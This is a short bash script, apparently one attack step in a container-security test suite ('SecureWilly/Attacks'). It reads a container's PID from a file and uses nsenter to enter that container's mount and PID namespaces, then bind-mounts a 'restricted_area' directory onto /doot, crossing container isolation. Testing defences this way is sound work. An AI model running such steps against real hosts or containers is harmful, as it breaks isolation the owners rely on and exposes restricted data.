#!/bin/bash

#Attacking directory where attacker's scripts are 
attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

#File created on previous script
container_pid=$(cat PID)

#Bind mounting of restricted_area to doot
nsenter --target ${container_pid} --mount --pid -- mount -o bind /tmpmount/${attack}/restricted_area /doot
